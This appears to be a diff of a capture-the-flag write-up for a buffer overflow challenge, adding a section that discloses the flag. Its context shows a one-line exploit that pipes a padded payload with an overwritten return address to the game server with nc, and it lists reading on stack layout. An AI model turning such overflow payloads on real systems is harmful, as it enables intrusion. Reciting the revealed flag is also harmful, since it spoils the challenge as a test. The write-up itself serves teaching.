@@ -38,6 +38,9 @@ Final command to exploit local program assuming machine uses little-endian:
 In order to get the flag, players have to pipe the output to the game server:  
 `python -c 'print "a" * 40 + "\xb1\x05\x40"' | nc play.spgame.site 50000`
 
+## Flag
+`GCTF{4W3S0M3_L177L3_P4R7Y}`
+
 ## Recommended Reads
 * https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
 * https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64
